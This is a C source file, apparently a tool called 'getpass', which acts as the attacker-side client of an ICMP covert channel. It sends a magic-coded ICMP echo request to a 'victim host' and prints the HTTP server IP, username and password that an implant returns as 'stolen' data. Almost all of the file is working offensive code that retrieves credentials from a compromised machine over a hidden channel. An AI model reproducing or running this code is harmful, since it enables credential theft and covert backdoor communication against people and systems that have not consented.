#include<stdlib.h>
#include<stdio.h>
#include<string.h>
#include<unistd.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<netinet/ip_icmp.h>
#include<linux/if_ether.h>
#include<arpa/inet.h>

#define BUFF_SIZE  256
#define SUCCESS    1
#define FAILURE    -1
#define MAGIC_CODE 0x77

struct sockaddr_in remoteip;
struct in_addr server_addr;
int recvsockfd = -1;
int sendsockfd = -1;
unsigned char recvbuff[BUFF_SIZE];
unsigned char sendbuff[BUFF_SIZE];

int load_args(const int argc, char **);
void print_cmdprompt();
int send_icmp_request();
int recv_icmp_reply();
unsigned short cksum(unsigned short *, int len);
void print_ippacket_inbyte(unsigned char *);

int main(int argc, char **argv) {
    if (load_args(argc, argv) < 0) {
        printf("command format error!\n");
        print_cmdprompt();
        return FAILURE;
    }
    recvsockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    sendsockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (recvsockfd < 0 || sendsockfd < 0) {
        perror("socket creation error");
        return FAILURE;
    }
    printf("running...\n");
    // 发送ICMP ECHO 回送请求报文
    send_icmp_request();
    // 接收ICMP ECHO 回送回答报文
    recv_icmp_reply();
    close(sendsockfd);
    close(recvsockfd);
    return 0;
}

int load_args(const int argc, char *argv[]) {
    if (argc != 2 || inet_aton(argv[1], &remoteip.sin_addr) == 0)
        return FAILURE;
    return SUCCESS;
}

void print_cmdprompt() {
    printf("\ngetpass [remoteip]\n\n");
    printf("\t    [remoteip]       Victim host IP address, eg: 192.168.107.132\n");
}

int send_icmp_request() {
    bzero(sendbuff, BUFF_SIZE);
    // 构造ICMP ECHO首部
    struct icmp *icmp = (struct icmp *)sendbuff;
    icmp->icmp_type = ICMP_ECHO; // ICMP_ECHO 8
    icmp->icmp_code = MAGIC_CODE;
    icmp->icmp_cksum = 0;
    // 计算ICMP校验和，涉及首部和数据部分，包括：8B(ICMP ECHO首部) + 		                       // 36B(4B(target_ip)+16B(username)+16B(password))
    icmp->icmp_cksum = cksum((unsigned short *)icmp, 8 + 36);

    printf("sending request........\n");
    int ret = sendto(sendsockfd, sendbuff, 44, 0, (struct sockaddr *)&remoteip, sizeof(remoteip));
    if (ret < 0) {
        perror("send error");
    } else {
        printf("send a icmp echo request packet!\n\n");
    }
    return SUCCESS;
}

int recv_icmp_reply() {
    bzero(recvbuff, BUFF_SIZE);
    printf("waiting for reply......\n");
    if (recv(recvsockfd, recvbuff, BUFF_SIZE, 0) < 0) {
        printf("failed getting reply packet\n");
        return FAILURE;
    }
    struct icmphdr *icmp = (struct icmphdr *)(recvbuff + 20);
    memcpy(&server_addr, (char *)icmp+8, 4);
    // 打印IP包字节数据，便于调试
    print_ippacket_inbyte(recvbuff);
    printf("stolen from http server: %s\n", inet_ntoa(server_addr));
    printf("username: %s\n", (char *)((char *)icmp + 12));
    printf("password: %s\n", (char *)((char *)icmp + 28));
    return SUCCESS;
}

unsigned short cksum(unsigned short *addr, int len) {
    int sum = 0;
    unsigned short res = 0;
    // len -= 2，sizeof(unsigned short) = 2;
    // sum += *(addr++)，每次偏移2Byte
    for (; len > 1; sum += *(addr++), len -= 2);
    // 每次处理2Byte，可能会存在多余的1Byte
    sum += len == 1 ? *addr : 0;
    // sum：高16位 + 低16位，高16位中存在可能的进位
    sum = (sum >> 16) + (sum & 0xffff);
    // sum + sum的高16位，高16位中存在可能的进位
    sum += (sum >> 16);
    // 经过2次对高16位中可能存在的进位进行处理，即可确保sum高16位中再无进位
    res = ~sum;
    return res;
}

void print_ippacket_inbyte(unsigned char *ipbuff) {
    struct ip *ip = (struct ip *)ipbuff;
    printf("                %02x %02x", ipbuff[0], ipbuff[1]);
    for (int i = 0, len = ntohs(ip->ip_len)-2; i < len; i++) {
        if (i % 16 == 0)
            printf("\n");
        if (i % 8 == 0)
            printf("  ");
        printf("%02x ", ipbuff[i+2]);
    }
    printf("\n");
}
